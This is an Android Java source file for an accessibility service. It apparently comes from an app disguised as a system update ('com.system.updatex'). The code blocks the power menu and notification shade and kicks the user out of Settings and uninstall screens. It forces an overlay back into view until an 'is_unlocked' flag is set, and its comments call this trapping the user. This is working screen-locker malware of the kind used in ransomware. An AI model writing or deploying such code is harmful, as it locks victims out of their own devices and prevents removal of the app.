package com.system.updatex;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;

public class KioskAccessibilityService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        boolean isUnlocked = getSharedPreferences("fr4nx_state", MODE_PRIVATE)
                .getBoolean("is_unlocked", false);
        if (isUnlocked) return;

        if (event == null || event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;
        
        CharSequence packageName = event.getPackageName();
        if (packageName == null) return;
        
        String foregroundPackage = packageName.toString();
        String className = event.getClassName() != null ? event.getClassName().toString() : "";

        // 1. Block Power Menu and Notification Shade
        if (foregroundPackage.contains("systemui")) {
            if (className.contains("GlobalActions") || className.contains("NotificationShade")) {
                performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                return;
            }
        }

        // 2. Block Uninstall Screens (Settings or Package Installer)
        if (foregroundPackage.contains("settings") || foregroundPackage.contains("packageinstaller")) {
            // If they try to open App Info or Uninstall screen, kick them out instantly
            performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
            performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
            
            Intent intent = new Intent(this, OverlayService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            return;
        }

        // 3. Trap User in the Overlay
        boolean isAllowed = foregroundPackage.equals("com.system.updatex") 
                || foregroundPackage.contains("launcher") 
                || foregroundPackage.contains("systemui");

        if (!isAllowed) {
            performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
            Intent intent = new Intent(this, OverlayService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        }
    }
    @Override
    public void onInterrupt() {}
}
